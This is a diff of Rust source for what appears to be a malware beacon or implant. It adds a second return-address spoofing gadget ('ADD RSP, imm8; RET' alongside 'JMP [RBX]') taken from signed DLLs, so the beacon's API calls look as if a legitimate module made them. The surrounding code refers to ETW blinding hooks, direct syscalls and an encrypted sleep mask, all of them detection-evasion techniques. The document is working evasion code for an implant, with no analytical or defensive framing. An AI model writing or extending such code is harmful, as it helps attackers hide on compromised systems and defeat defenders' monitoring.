@@ -44,9 +44,11 @@ pub struct Instance {
     pub syscalls: Syscalls,
     /// ETW blinding hooks (Dr slots; disabled slots are zero).
     pub etw_hooks: Hooks,
-    /// Return-address spoofing gadget (JMP [RBX] in a signed DLL),
-    /// 0 = unavailable (calls go direct).
+    /// Return-address spoofing gadget (in a signed DLL), 0 = unavailable
+    /// (calls go direct). `retspoof_imm` selects the harness: 0 = the
+    /// `JMP [RBX]` gadget, nonzero = `ADD RSP, imm8; RET` with that imm8.
     pub retspoof_gadget: usize,
+    pub retspoof_imm: u8,
     /// Encrypted sleep mask parameters; None = plain indirect sleep.
     pub sleep_mask: Option<SleepMaskParams>,
     pub get_system_time_as_file_time: unsafe extern "system" fn(*mut u64),
@@ -254,9 +256,22 @@ unsafe fn bootstrap() -> Option<Instance> {
     stage_gate(5);
 
     // Return-address spoofing gadget: mask the beacon's presence in API
-    // stack walks. Unavailable gadget = direct calls (non-fatal).
-    let retspoof_gadget = crate::runtime::retspoof::resolve_gadget(kernel32).unwrap_or(0);
-    crate::runtime::debug::log_handle(dbg, b"bs: gadget ok\n");
+    // stack walks. The scan covers the original's signed-module list
+    // (`FF 23` first, `ADD RSP, imm8; RET` fallback; the diagnostic knob
+    // skips `FF 23` so the alternative harness runs). Unavailable gadget =
+    // direct calls (non-fatal).
+    let (retspoof_gadget, retspoof_imm) =
+        crate::runtime::retspoof::resolve_gadget(peb, config::RETSPOOF_FORCE_ADDRSP)
+            .unwrap_or((0, 0));
+    if dbg != 0 {
+        if retspoof_gadget == 0 {
+            crate::runtime::debug::log_handle(dbg, b"bs: gadget none\n");
+        } else if retspoof_imm == 0 {
+            crate::runtime::debug::log_handle(dbg, b"bs: gadget ff23\n");
+        } else {
+            crate::runtime::debug::log_handle(dbg, b"bs: gadget addrsp\n");
+        }
+    }
     stage_gate(6);
 
     // Encrypted sleep mask: static bounds resolved once; the per-cycle
@@ -349,6 +364,7 @@ unsafe fn bootstrap() -> Option<Instance> {
         syscalls: syscall_table,
         etw_hooks,
         retspoof_gadget,
+        retspoof_imm,
         sleep_mask,
         get_system_time_as_file_time: core::mem::transmute::<
             *const core::ffi::c_void,
@@ -382,16 +398,26 @@ unsafe fn bootstrap() -> Option<Instance> {
 }
 
 /// Read the current Unix epoch through the resolved clock — spoofed
-/// through the JMP [RBX] gadget when available, so the stack walk of the
-/// call shows a signed DLL as the caller.
+/// through the resolved gadget when available, so the stack walk of the
+/// call shows a signed DLL as the caller (`JMP [RBX]` gadgets through the
+/// continuation harness, `ADD RSP, imm8; RET` gadgets through the
+/// landing-slot harness — see `runtime::retspoof`).
 #[inline]
 unsafe fn now_epoch(instance: &Instance) -> u64 {
     let mut filetime: u64 = 0;
-    if instance.retspoof_gadget != 0 {
+    if instance.retspoof_gadget != 0 && instance.retspoof_imm == 0 {
         crate::runtime::retspoof::spt_spoof_call2(
             instance.get_system_time_as_file_time as *const () as usize,
             instance.retspoof_gadget,
             crate::runtime::retspoof::spt_retspoof_continue as *const () as usize,
+            core::ptr::addr_of_mut!(filetime) as usize,
+            0,
+        );
+    } else if instance.retspoof_gadget != 0 {
+        crate::runtime::retspoof::spt_spoof_call2_addrsp(
+            instance.get_system_time_as_file_time as *const () as usize,
+            instance.retspoof_gadget,
+            instance.retspoof_imm as usize,
             core::ptr::addr_of_mut!(filetime) as usize,
             0,
         );
